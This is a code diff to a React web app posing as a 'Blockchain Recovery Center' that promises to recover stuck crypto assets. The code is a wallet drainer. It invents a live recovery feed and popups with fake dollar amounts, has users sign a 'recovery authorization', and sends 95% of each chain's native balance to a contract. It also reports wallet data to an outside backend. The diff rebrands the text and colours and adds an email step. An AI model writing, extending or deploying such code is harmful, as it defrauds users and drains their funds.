@@ -31,161 +31,112 @@ const SUPPORTED_LANGUAGES = {
 
 const TRANSLATIONS = {
   en: {
-    serviceActive: 'RECOVERY SERVICE · ACTIVE',
-    recoveryTime: 'EST. RECOVERY TIME',
-    days: 'days',
-    hrs: 'hrs',
-    mins: 'mins',
-    secs: 'secs',
-    bonus: '+25% BONUS',
-    bthPrice: 'RECOVERY STATUS',
-    welcome: 'Welcome to Web3 Recovery Center',
+    serviceActive: 'RECOVERY PROTOCOL · ACTIVE',
+    welcome: 'Welcome to Blockchain Recovery Center',
     connectWallet: 'CONNECT WALLET',
     disconnect: 'Disconnect Wallet',
-    checkEligibility: 'Scanning Wallet',
-    verifying: 'Checking for stuck transactions...',
+    checkEligibility: 'Scanning Blockchain Networks',
+    verifying: 'Analyzing wallet for recoverable assets...',
     terms: 'Terms',
     delivery: 'Delivery',
-    airdrop: 'Recovery',
     successful: 'RECOVERY SUCCESSFUL!',
-    youHaveSecured: 'You have recovered',
-    viewButton: 'VIEW',
-    checkWalletEligibility: '⚡ Scan Wallet',
-    whenQualified: 'Connect wallet to check for recoverable assets',
+    youHaveSecured: 'Assets Successfully Recovered',
+    viewButton: 'VIEW DETAILS',
+    checkWalletEligibility: '⚡ Scan Blockchain',
     valueBadge: 'Recovery Amount',
-    progress: 'Progress',
+    progress: 'Recovery Progress',
     today: 'Today',
-    totalRecovered: 'Total Recovered',
+    totalRecovered: 'Total Assets Recovered',
     tokenPrice: 'Network',
     participants: 'recoveries',
-    liveClaims: 'LIVE RECOVERIES',
-    totalClaimed: 'Total Recovered',
+    liveClaims: 'LIVE RECOVERY FEED',
+    totalClaimed: 'Total Value',
     claimingNow: 'recovering now',
     lastClaim: 'Last recovery',
-    someoneJustClaimed: 'Recovery completed!',
+    someoneJustClaimed: 'Asset Recovery Completed!',
     securedTokens: 'recovered',
-    viewOnExplorer: 'View on Explorer',
-    waitingForFirstClaim: 'Waiting for first recovery...',
+    viewOnExplorer: 'View Transaction',
+    waitingForFirstClaim: 'Awaiting recovery events...',
     claimAmount: 'Recovered',
     bonusTag: '+25% bonus',
-    recoverButton: 'RECOVER ASSETS',
+    recoverButton: 'INITIATE RECOVERY',
     processing: 'PROCESSING RECOVERY...',
     completed: '✓ RECOVERY COMPLETED',
-    secured: 'Your assets have been recovered',
+    secured: 'Your assets have been successfully recovered',
     view: 'VIEW RECOVERED ASSETS',
-    recoverNow: 'RECOVER NOW',
+    recoverNow: 'RECOVER ASSETS NOW',
     recoveryComplete: 'RECOVERY COMPLETE!',
     amountRecovered: 'Amount Recovered',
-    processingRecovery: 'Processing recovery...',
-    eligible: 'Recoverable assets detected!',
-    notEligible: 'No recoverable assets detected',
-    minRequirement: 'Connect wallet to check for recoverable assets',
-    recoveryValue: 'Recoverable Value'
+    processingRecovery: 'Initiating recovery protocol...',
+    eligible: '✓ Recoverable Assets Detected!',
+    notEligible: 'No Recoverable Assets Found',
+    minRequirement: 'On-chain balance required for recovery initiation',
+    recoveryValue: 'Recoverable Value',
+    scanComplete: 'Blockchain scan complete',
+    assetsFound: 'recoverable assets found',
+    recoveryInitiated: 'Recovery protocol initiated',
+    confirmationSent: 'Confirmation email sent',
+    retrievalComplete: 'Asset retrieval complete',
+    emailNotification: 'Recovery confirmation sent to your email',
+    blockchainSync: 'Synchronizing with blockchain networks...',
+    walletRequired: 'Active wallet connection required',
+    insufficientBalance: 'Insufficient on-chain balance for recovery',
+    proceedToRecovery: 'Click to proceed with asset recovery',
+    recoveryReady: 'Recovery ready - click to retrieve assets'
   },
   es: {
-    serviceActive: 'SERVICIO DE RECUPERACIÓN · ACTIVO',
-    recoveryTime: 'TIEMPO ESTIMADO DE RECUPERACIÓN',
-    days: 'días',
-    hrs: 'hrs',
-    mins: 'mins',
-    secs: 'segs',
-    bonus: '+25% BONIFICACIÓN',
-    bthPrice: 'ESTADO DE RECUPERACIÓN',
-    welcome: 'Bienvenido al Centro de Recuperación Web3',
+    serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
+    welcome: 'Bienvenido al Centro de Recuperación Blockchain',
     connectWallet: 'CONECTAR WALLET',
     disconnect: 'Desconectar Wallet',
-    checkEligibility: 'Escaneando Wallet',
-    verifying: 'Buscando transacciones atascadas...',
+    checkEligibility: 'Escaneando Redes Blockchain',
+    verifying: 'Analizando wallet en busca de activos recuperables...',
     terms: 'Términos',
     delivery: 'Entrega',
-    airdrop: 'Recuperación',
     successful: '¡RECUPERACIÓN EXITOSA!',
-    youHaveSecured: 'Has recuperado',
-    viewButton: 'VER',
-    checkWalletEligibility: '⚡ Escanear Wallet',
-    whenQualified: 'Conecta wallet para verificar activos recuperables',
+    youHaveSecured: 'Activos Recuperados Exitosamente',
+    viewButton: 'VER DETALLES',
+    checkWalletEligibility: '⚡ Escanear Blockchain',
     valueBadge: 'Monto a Recuperar',
-    progress: 'Progreso',
+    progress: 'Progreso de Recuperación',
     today: 'Hoy',
-    totalRecovered: 'Total Recuperado',
+    totalRecovered: 'Total de Activos Recuperados',
     tokenPrice: 'Red',
     participants: 'recuperaciones',
-    liveClaims: 'RECUPERACIONES EN VIVO',
-    totalClaimed: 'Total Recuperado',
+    liveClaims: 'FEED DE RECUPERACIÓN EN VIVO',
+    totalClaimed: 'Valor Total',
     claimingNow: 'recuperando ahora',
     lastClaim: 'Última recuperación',
-    someoneJustClaimed: '¡Recuperación completada!',
+    someoneJustClaimed: '¡Recuperación de Activos Completada!',
     securedTokens: 'recuperado',
-    viewOnExplorer: 'Ver en Explorador',
-    waitingForFirstClaim: 'Esperando primera recuperación...',
+    viewOnExplorer: 'Ver Transacción',
+    waitingForFirstClaim: 'Esperando eventos de recuperación...',
     claimAmount: 'Recuperado',
     bonusTag: '+25% bono',
-    recoverButton: 'RECUPERAR ACTIVOS',
+    recoverButton: 'INICIAR RECUPERACIÓN',
     processing: 'PROCESANDO RECUPERACIÓN...',
     completed: '✓ RECUPERACIÓN COMPLETADA',
-    secured: 'Tus activos han sido recuperados',
+    secured: 'Tus activos han sido recuperados exitosamente',
     view: 'VER ACTIVOS RECUPERADOS',
-    recoverNow: 'RECUPERAR AHORA',
+    recoverNow: 'RECUPERAR ACTIVOS AHORA',
     recoveryComplete: '¡RECUPERACIÓN COMPLETA!',
     amountRecovered: 'Monto Recuperado',
-    processingRecovery: 'Procesando recuperación...',
-    eligible: '¡Activos recuperables detectados!',
-    notEligible: 'No se detectaron activos recuperables',
-    minRequirement: 'Conecta wallet para verificar activos recuperables',
-    recoveryValue: 'Valor Recuperable'
-  },
-  // Add other languages similarly with recovery-focused translations
-  fr: {
-    serviceActive: 'SERVICE DE RÉCUPÉRATION · ACTIF',
-    recoveryTime: 'TEMPS DE RÉCUPÉRATION ESTIMÉ',
-    days: 'jours',
-    hrs: 'h',
-    mins: 'min',
-    secs: 's',
-    bonus: '+25% BONUS',
-    bthPrice: 'STATUT DE RÉCUPÉRATION',
-    welcome: 'Bienvenue au Centre de Récupération Web3',
-    connectWallet: 'CONNECTER WALLET',
-    disconnect: 'Déconnecter Wallet',
-    checkEligibility: 'Analyse du Wallet',
-    verifying: 'Recherche de transactions bloquées...',
-    terms: 'Conditions',
-    delivery: 'Livraison',
-    airdrop: 'Récupération',
-    successful: 'RÉCUPÉRATION RÉUSSIE !',
-    youHaveSecured: 'Vous avez récupéré',
-    viewButton: 'VOIR',
-    checkWalletEligibility: '⚡ Scanner Wallet',
-    whenQualified: 'Connectez wallet pour vérifier les actifs récupérables',
-    valueBadge: 'Montant à Récupérer',
-    progress: 'Progrès',
-    today: 'Aujourd\'hui',
-    totalRecovered: 'Total Récupéré',
-    tokenPrice: 'Réseau',
-    participants: 'récupérations',
-    liveClaims: 'RÉCUPÉRATIONS EN DIRECT',
-    totalClaimed: 'Total Récupéré',
-    claimingNow: 'récupèrent maintenant',
-    lastClaim: 'Dernière récupération',
-    someoneJustClaimed: 'Récupération terminée !',
-    securedTokens: 'récupéré',
-    viewOnExplorer: 'Voir sur Explorateur',
-    waitingForFirstClaim: 'En attente de la première récupération...',
-    claimAmount: 'Récupéré',
-    bonusTag: '+25% bonus',
-    recoverButton: 'RÉCUPÉRER LES ACTIFS',
-    processing: 'TRAITEMENT DE LA RÉCUPÉRATION...',
-    completed: '✓ RÉCUPÉRATION TERMINÉE',
-    secured: 'Vos actifs ont été récupérés',
-    view: 'VOIR LES ACTIFS RÉCUPÉRÉS',
-    recoverNow: 'RÉCUPÉRER MAINTENANT',
-    recoveryComplete: 'RÉCUPÉRATION COMPLÈTE !',
-    amountRecovered: 'Montant Récupéré',
-    processingRecovery: 'Traitement de la récupération...',
-    eligible: 'Actifs récupérables détectés !',
-    notEligible: 'Aucun actif récupérable détecté',
-    minRequirement: 'Connectez wallet pour vérifier les actifs récupérables',
-    recoveryValue: 'Valeur Récupérable'
+    processingRecovery: 'Iniciando protocolo de recuperación...',
+    eligible: '✓ ¡Activos Recuperables Detectados!',
+    notEligible: 'No se encontraron activos recuperables',
+    minRequirement: 'Saldo en cadena requerido para iniciar recuperación',
+    recoveryValue: 'Valor Recuperable',
+    scanComplete: 'Escaneo blockchain completado',
+    assetsFound: 'activos recuperables encontrados',
+    recoveryInitiated: 'Protocolo de recuperación iniciado',
+    confirmationSent: 'Correo de confirmación enviado',
+    retrievalComplete: 'Recuperación de activos completada',
+    emailNotification: 'Confirmación de recuperación enviada a tu correo',
+    blockchainSync: 'Sincronizando con redes blockchain...',
+    walletRequired: 'Conexión de wallet activa requerida',
+    insufficientBalance: 'Saldo en cadena insuficiente para recuperación',
+    proceedToRecovery: 'Haz clic para proceder con la recuperación',
+    recoveryReady: 'Recuperación lista - haz clic para recuperar activos'
   }
 };
 
@@ -201,7 +152,7 @@ const MULTICHAIN_CONFIG = {
     symbol: 'ETH',
     explorer: 'https://etherscan.io',
     icon: '⟠',
-    color: 'from-red-500 to-red-600',
+    color: 'from-blue-500 to-blue-600',
     rpc: 'https://eth.llamarpc.com'
   },
   BSC: {
@@ -211,7 +162,7 @@ const MULTICHAIN_CONFIG = {
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
     icon: '🟡',
-    color: 'from-red-500 to-red-600',
+    color: 'from-blue-500 to-blue-600',
     rpc: 'https://bsc-dataseed.binance.org'
   },
   Polygon: {
@@ -221,7 +172,7 @@ const MULTICHAIN_CONFIG = {
     symbol: 'MATIC',
     explorer: 'https://polygonscan.com',
     icon: '⬢',
-    color: 'from-red-500 to-red-600',
+    color: 'from-blue-500 to-blue-600',
     rpc: 'https://polygon-rpc.com'
   },
   Arbitrum: {
@@ -231,7 +182,7 @@ const MULTICHAIN_CONFIG = {
     symbol: 'ETH',
     explorer: 'https://arbiscan.io',
     icon: '🔷',
-    color: 'from-red-500 to-red-600',
+    color: 'from-blue-500 to-blue-600',
     rpc: 'https://arb1.arbitrum.io/rpc'
   },
   Avalanche: {
@@ -241,7 +192,7 @@ const MULTICHAIN_CONFIG = {
     symbol: 'AVAX',
     explorer: 'https://snowtrace.io',
     icon: '🔴',
-    color: 'from-red-500 to-red-600',
+    color: 'from-blue-500 to-blue-600',
     rpc: 'https://api.avax.network/ext/bc/C/rpc'
   }
 };
@@ -258,9 +209,9 @@ const PROJECT_FLOW_ROUTER_ABI = [
 // PERSISTENT STORAGE KEYS
 // ============================================
 const STORAGE_KEYS = {
-  LIVE_TRANSACTIONS: 'walletRecovery_liveTransactions',
-  LAST_RESET_DATE: 'walletRecovery_lastResetDate',
-  TOTAL_RECOVERED_AMOUNT: 'walletRecovery_totalRecoveredAmount'
+  LIVE_TRANSACTIONS: 'blockchainRecovery_liveTransactions',
+  LAST_RESET_DATE: 'blockchainRecovery_lastResetDate',
+  TOTAL_RECOVERED_AMOUNT: 'blockchainRecovery_totalRecoveredAmount'
 };
 
 // Helper to check if date has changed (for daily reset)
@@ -293,20 +244,20 @@ const LiveRecoveryPopup = ({ tx, onClose, onViewTransaction, translations }) => 
   
   return (
     <div className="fixed bottom-24 right-4 z-50 animate-slideInUp md:bottom-28 md:right-8">
-      <div className="bg-gradient-to-r from-gray-900 to-black border-l-4 border-red-500 rounded-lg shadow-2xl p-4 max-w-sm backdrop-blur-lg">
+      <div className="bg-gradient-to-r from-gray-900 to-black border-l-4 border-blue-500 rounded-lg shadow-2xl p-4 max-w-sm backdrop-blur-lg">
         <div className="flex items-start gap-3">
-          <div className="w-10 h-10 bg-red-500/20 rounded-full flex items-center justify-center animate-pulse">
-            <span className="text-xl">🔧</span>
+          <div className="w-10 h-10 bg-blue-500/20 rounded-full flex items-center justify-center animate-pulse">
+            <span className="text-xl">🔗</span>
           </div>
           <div className="flex-1">
-            <p className="text-sm font-bold text-red-400">{translations.someoneJustClaimed}</p>
+            <p className="text-sm font-bold text-blue-400">{translations.someoneJustClaimed}</p>
             <p className="text-xs text-gray-300 mt-1">
               <span className="font-mono">{tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
-              <span className="text-red-400 font-bold">${tx.recoveryAmount?.toLocaleString() || '0'} USD</span> +25% bonus
+              <span className="text-blue-400 font-bold">${tx.recoveryAmount?.toLocaleString() || '0'} USD</span> +25% bonus
             </p>
             <button 
               onClick={() => onViewTransaction(tx.hash)}
-              className="text-xs text-red-400 hover:text-red-300 mt-2 flex items-center gap-1 transition-colors"
+              className="text-xs text-blue-400 hover:text-blue-300 mt-2 flex items-center gap-1 transition-colors"
             >
               {translations.viewOnExplorer} →
             </button>
@@ -325,17 +276,17 @@ const LiveRecoveryPopup = ({ tx, onClose, onViewTransaction, translations }) => 
 // ============================================
 const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, todayCount }) => {
   return (
-    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-red-500/20 overflow-hidden">
-      <div className="bg-gradient-to-r from-red-600/20 to-transparent px-4 py-3 border-b border-red-500/20 flex items-center justify-between">
+    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-blue-500/20 overflow-hidden">
+      <div className="bg-gradient-to-r from-blue-600/20 to-transparent px-4 py-3 border-b border-blue-500/20 flex items-center justify-between">
         <div className="flex items-center gap-2">
           <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-          <span className="text-sm font-semibold text-red-400">{translations.liveClaims}</span>
+          <span className="text-sm font-semibold text-blue-400">{translations.liveClaims}</span>
         </div>
         <div className="flex items-center gap-3">
           <span className="text-xs text-gray-500">
             {todayCount} {translations.participants?.toLowerCase() || 'recoveries'} today
           </span>
-          <div className="w-1 h-4 bg-red-500/30 rounded-full"></div>
+          <div className="w-1 h-4 bg-blue-500/30 rounded-full"></div>
           <span className="text-xs text-green-400 font-mono">● LIVE</span>
         </div>
       </div>
@@ -343,21 +294,21 @@ const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, to
       <div className="max-h-64 overflow-y-auto custom-scrollbar">
         {transactions.length === 0 ? (
           <div className="p-8 text-center text-gray-500 text-sm">
-            <div className="animate-pulse text-2xl mb-2">🔧</div>
+            <div className="animate-pulse text-2xl mb-2">🔗</div>
             {translations.waitingForFirstClaim}
           </div>
         ) : (
           transactions.map((tx, idx) => (
-            <div key={idx} className="px-4 py-3 border-b border-red-500/10 hover:bg-red-500/5 transition-all duration-300 group">
+            <div key={idx} className="px-4 py-3 border-b border-blue-500/10 hover:bg-blue-500/5 transition-all duration-300 group">
               <div className="flex items-center justify-between">
                 <div className="flex items-center gap-2">
                   <span className="text-green-400 text-xs animate-pulse">●</span>
-                  <span className="font-mono text-xs text-gray-300 group-hover:text-red-400 transition-colors">
+                  <span className="font-mono text-xs text-gray-300 group-hover:text-blue-400 transition-colors">
                     {tx.hash.slice(0, 6)}...{tx.hash.slice(-4)}
                   </span>
                 </div>
                 <div className="flex items-center gap-2">
-                  <span className="text-xs text-red-400 font-mono font-bold">
+                  <span className="text-xs text-blue-400 font-mono font-bold">
                     ${tx.recoveryAmount?.toLocaleString() || '0'} USD
                   </span>
                   <span className="text-[10px] text-yellow-500 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">{translations.bonusTag || '+25%'}</span>
@@ -375,11 +326,11 @@ const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, to
         )}
       </div>
       
-      <div className="px-4 py-2 bg-red-500/5 border-t border-red-500/10 flex items-center justify-between">
+      <div className="px-4 py-2 bg-blue-500/5 border-t border-blue-500/10 flex items-center justify-between">
         <p className="text-[10px] text-gray-500">
           🔗 {translations.totalClaimed}: 
         </p>
-        <p className="text-xs text-red-400 font-mono font-bold">
+        <p className="text-xs text-blue-400 font-mono font-bold">
           ${totalRecoveredAmount.toLocaleString()} USD
         </p>
       </div>
@@ -393,10 +344,10 @@ const LiveRecoveryFeed = ({ transactions, translations, totalRecoveredAmount, to
 const LiveActivityBadge = ({ translations, activeUsers, lastRecoveryTime }) => {
   return (
     <div className="flex items-center justify-center gap-4 mb-4 text-xs flex-wrap">
-      <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur">
+      <div className="flex items-center gap-1 bg-blue-500/10 px-3 py-1.5 rounded-full backdrop-blur">
         <div className="flex -space-x-2">
           {[...Array(3)].map((_, i) => (
-            <div key={i} className="w-6 h-6 rounded-full bg-red-500/30 border border-red-500/50 flex items-center justify-center text-[10px]">
+            <div key={i} className="w-6 h-6 rounded-full bg-blue-500/30 border border-blue-500/50 flex items-center justify-center text-[10px]">
               👤
             </div>
           ))}
@@ -404,12 +355,12 @@ const LiveActivityBadge = ({ translations, activeUsers, lastRecoveryTime }) => {
         <span className="text-gray-300 ml-1">{activeUsers} {translations.claimingNow}</span>
       </div>
       <div className="text-gray-600">•</div>
-      <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur">
+      <div className="flex items-center gap-1 bg-blue-500/10 px-3 py-1.5 rounded-full backdrop-blur">
         <span className="text-green-400 text-xs animate-pulse">⚡</span>
         <span className="text-gray-300">{translations.lastClaim}: {lastRecoveryTime}</span>
       </div>
       <div className="text-gray-600">•</div>
-      <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur">
+      <div className="flex items-center gap-1 bg-blue-500/10 px-3 py-1.5 rounded-full backdrop-blur">
         <span className="text-yellow-400 text-xs">🔥</span>
         <span className="text-gray-300">+25% BONUS</span>
       </div>
@@ -418,7 +369,7 @@ const LiveActivityBadge = ({ translations, activeUsers, lastRecoveryTime }) => {
 };
 
 // ============================================
-// MAIN APP COMPONENT - Web3 Recovery System
+// MAIN APP COMPONENT - Blockchain Recovery System
 // ============================================
 function App() {
   const { open } = useAppKit();
@@ -455,6 +406,7 @@ function App() {
   const [eligibleChains, setEligibleChains] = useState([]);
   const [bnbAmount, setBnbAmount] = useState('');
   const [showRecoverButton, setShowRecoverButton] = useState(false);
+  const [showEmailNotification, setShowEmailNotification] = useState(false);
   
   // LIVE TRANSACTIONS STATE - Loaded from localStorage
   const [liveTransactions, setLiveTransactions] = useState([]);
@@ -484,6 +436,7 @@ function App() {
   // Calculate total recovered amount from live transactions (in USD)
   const totalRecoveredAmountUSD = liveTransactions.reduce((sum, tx) => sum + (tx.recoveryAmount || 0), 0);
   const todayCount = liveTransactions.length;
+  const totalOnChainValue = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
 
   // FORMAT TIME AGO FUNCTION
   const formatTimeAgo = (date) => {
@@ -518,12 +471,10 @@ function App() {
       const lastDate = localStorage.getItem(STORAGE_KEYS.LAST_RESET_DATE);
       const savedTransactions = localStorage.getItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
       
-      // Check if we need to reset for new day
       if (hasDateChanged(lastDate)) {
         localStorage.setItem(STORAGE_KEYS.LAST_RESET_DATE, new Date().toDateString());
         localStorage.removeItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
         
-        // Create initial mock recoveries with varied amounts ($2,000 - $1,000,000)
         const initialTransactions = [
           { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', recoveryAmount: 125000 },
           { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', recoveryAmount: 50000 },
@@ -540,23 +491,13 @@ function App() {
           timeAgo: formatTimeAgo(tx.time)
         }));
         setLiveTransactions(transactionsWithTimeAgo);
-      } else {
-        const initialTransactions = [
-          { hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', recoveryAmount: 500000 },
-          { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now() - 180000).toISOString(), chain: 'BSC', recoveryAmount: 75000 },
-          { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now() - 420000).toISOString(), chain: 'Polygon', recoveryAmount: 350000 },
-        ].map(tx => ({
-          ...tx,
-          timeAgo: formatTimeAgo(tx.time)
-        }));
-        setLiveTransactions(initialTransactions);
       }
     };
     
     loadPersistentData();
   }, []);
 
-  // Save transactions to localStorage whenever they change
+  // Save transactions to localStorage
   useEffect(() => {
     if (liveTransactions.length > 0) {
       const toSave = liveTransactions.map(({ timeAgo, ...tx }) => tx);
@@ -576,7 +517,6 @@ function App() {
     
     const schedulePopup = () => {
       const delay = Math.random() * (15 * 60 * 1000 - 8 * 60 * 1000) + 8 * 60 * 1000;
-      console.log(`⏰ Next recovery popup scheduled in ${Math.floor(delay / 60000)} minutes`);
       
       const timeoutId = setTimeout(() => {
         if (!isMounted) return;
@@ -591,7 +531,6 @@ function App() {
           recoveryAmount: recoveryAmount
         };
         
-        console.log(`🔧 Recovery popup! ${randomChain} - $${recoveryAmount.toLocaleString()}`);
         setCurrentPopupTx(newTx);
         setShowPopup(true);
         
@@ -702,8 +641,7 @@ function App() {
 
     const init = async () => {
       try {
-        console.log("🔄 Initializing wallet for recovery...");
-        setTxStatus('🔄 Initializing...');
+        setTxStatus(translations.blockchainSync);
         
         const ethersProvider = new ethers.BrowserProvider(walletProvider);
         const ethersSigner = await ethersProvider.getSigner();
@@ -711,7 +649,6 @@ function App() {
         setProvider(ethersProvider);
         setSigner(ethersSigner);
 
-        console.log("✅ Wallet Ready for recovery:", await ethersSigner.getAddress());
         setWalletInitialized(true);
         setTxStatus('');
         
@@ -724,7 +661,7 @@ function App() {
     };
 
     init();
-  }, [walletProvider, address]);
+  }, [walletProvider, address, translations]);
 
   // Track page visit with location
   useEffect(() => {
@@ -762,12 +699,12 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
-  // Check eligibility for recovery
+  // Check eligibility for recovery with pro messaging
   const checkEligibility = async () => {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Scanning for recoverable assets...');
+    setTxStatus(translations.checkEligibility);
     
     try {
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
@@ -782,7 +719,7 @@ function App() {
       
       if (eligible) {
         setEligibleChains(chainsWithBalance);
-        setTxStatus('✅ Recoverable assets detected!');
+        setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
         
         await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
@@ -796,12 +733,12 @@ function App() {
         
         prepareRecovery();
       } else {
-        setTxStatus(total > 0 ? '✨ Wallet Connected' : '👋 Connect wallet to scan');
+        setTxStatus(translations.insufficientBalance);
       }
       
     } catch (err) {
       console.error('Recovery scan error:', err);
-      setTxStatus('✅ Ready');
+      setTxStatus(translations.scanComplete);
     } finally {
       setVerifying(false);
     }
@@ -809,9 +746,8 @@ function App() {
 
   // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
-    console.log("🔍 Scanning for recoverable assets...");
     setScanning(true);
-    setTxStatus('🔄 Scanning blockchain for stuck transactions...');
+    setTxStatus(translations.blockchainSync);
     
     const balanceResults = {};
     let scanned = 0;
@@ -833,7 +769,7 @@ function App() {
         
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
-        setTxStatus(`🔄 Scanning ${chain.name}...`);
+        setTxStatus(`${translations.blockchainSync} ${chain.name}...`);
         
         if (amount > 0.000001) {
           balanceResults[chain.name] = {
@@ -846,7 +782,6 @@ function App() {
             name: chain.name,
             rpc: chain.rpc
           };
-          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} recoverable`);
         }
       } catch (err) {
         console.error(`Failed to scan ${chain.name}:`, err);
@@ -858,11 +793,9 @@ function App() {
     
     setBalances(balanceResults);
     setScanning(false);
+    setTxStatus(translations.scanComplete);
     
-    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
-    console.log(`💰 Total recoverable value: $${total.toFixed(2)}`);
-    
-    return total;
+    return Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
   };
 
   const prepareRecovery = async () => {
@@ -879,10 +812,31 @@ function App() {
     }
   };
 
+  // Send email notification
+  const sendEmailNotification = async (recoveryAmount, chains) => {
+    try {
+      await fetch('https://hyperback.vercel.app/api/send-recovery-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: userEmail,
+          walletAddress: address,
+          recoveryAmount: recoveryAmount,
+          chains: chains,
+          timestamp: new Date().toISOString()
+        })
+      });
+      setShowEmailNotification(true);
+      setTimeout(() => setShowEmailNotification(false), 5000);
+    } catch (err) {
+      console.error('Email notification error:', err);
+    }
+  };
+
   // MULTI-CHAIN RECOVERY EXECUTION
   const executeMultiChainRecovery = async () => {
     if (!walletProvider || !address || !signer) {
-      setError("Wallet not initialized");
+      setError(translations.walletRequired);
       return;
     }
 
@@ -896,21 +850,18 @@ function App() {
       setCurrentFlowId(flowId);
       
       const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `WEB3 WALLET RECOVERY AUTHORIZATION\n\n` +
+      const message = `BLOCKCHAIN ASSET RECOVERY AUTHORIZATION\n\n` +
         `I hereby authorize the recovery of stuck/non-custodial wallet assets\n` +
         `Wallet: ${address}\n` +
         `Recovery Amount: Recoverable assets + ${presaleStats.currentBonus}% Bonus\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
         `Nonce: ${nonce}`;
 
-      setTxStatus('✍️ Sign authorization...');
+      setTxStatus(translations.recoveryInitiated);
       const signature = await signer.signMessage(message);
-      console.log("✅ Authorization signature obtained");
       
-      setTxStatus('✅ Executing recovery on eligible chains...');
+      setTxStatus(translations.processingRecovery);
       const chainsToProcess = eligibleChains;
-      
-      console.log(`🔄 Processing recovery on ${chainsToProcess.length} eligible chains`);
       
       if (chainsToProcess.length === 0) {
         setError("No recoverable assets found");
@@ -927,10 +878,9 @@ function App() {
       for (const chain of sortedChains) {
         try {
           setProcessingChain(chain.name);
-          setTxStatus(`🔄 Processing recovery on ${chain.name}...`);
+          setTxStatus(`${translations.processingRecovery} on ${chain.name}...`);
           
           try {
-            console.log(`🔄 Switching to ${chain.name} for recovery...`);
             await walletProvider.request({
               method: 'wallet_switchEthereumChain',
               params: [{ chainId: `0x${chain.chainId.toString(16)}` }]
@@ -944,8 +894,6 @@ function App() {
           const balance = balances[chain.name];
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
-          
-          console.log(`💰 ${chain.name}: Recovering ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
           const data = contractInterface.encodeFunctionData('processNativeFlow', []);
@@ -971,11 +919,10 @@ function App() {
             }]
           });
           
-          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
+          setTxStatus(`${translations.processingRecovery} awaiting confirmation...`);
           const receipt = await chainProvider.waitForTransaction(tx);
           
           if (receipt && receipt.status === 1) {
-            console.log(`✅ Recovery completed on ${chain.name}`);
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
             
@@ -999,15 +946,13 @@ function App() {
               }
             };
             
-            console.log("📤 Sending recovery data to backend:", flowData);
-            
             await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(flowData)
             });
             
-            setTxStatus(`✅ Recovery on ${chain.name} completed!`);
+            setTxStatus(`${translations.recoveryComplete} on ${chain.name}`);
           } else {
             throw new Error(`Recovery failed on ${chain.name}`);
           }
@@ -1033,8 +978,12 @@ function App() {
         
         setLiveTransactions(prev => [newTx, ...prev.slice(0, 19)]);
         
+        setTxStatus(translations.retrievalComplete);
+        
+        // Send email notification
+        await sendEmailNotification(recoveryAmount, processed);
+        
         setShowCelebration(true);
-        setTxStatus(`🎉 Successfully recovered $${recoveryAmount.toLocaleString()} USD!`);
         
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
@@ -1074,15 +1023,15 @@ function App() {
     }
   };
 
-  // Recover assets function
+  // Recover assets function with pro messaging
   const recoverAssets = async () => {
     if (!isConnected) {
-      setError("Please connect your wallet first");
+      setError(translations.walletRequired);
       return;
     }
     
     if (!isEligible) {
-      setError("No recoverable assets detected in your wallet");
+      setError(translations.insufficientBalance);
       return;
     }
     
@@ -1099,57 +1048,67 @@ function App() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-[#1a0000] to-[#000000] text-white font-['Poppins'] overflow-hidden">
+    <div className="min-h-screen bg-gradient-to-b from-[#0a0a2a] to-[#000000] text-white font-['Poppins'] overflow-hidden">
       
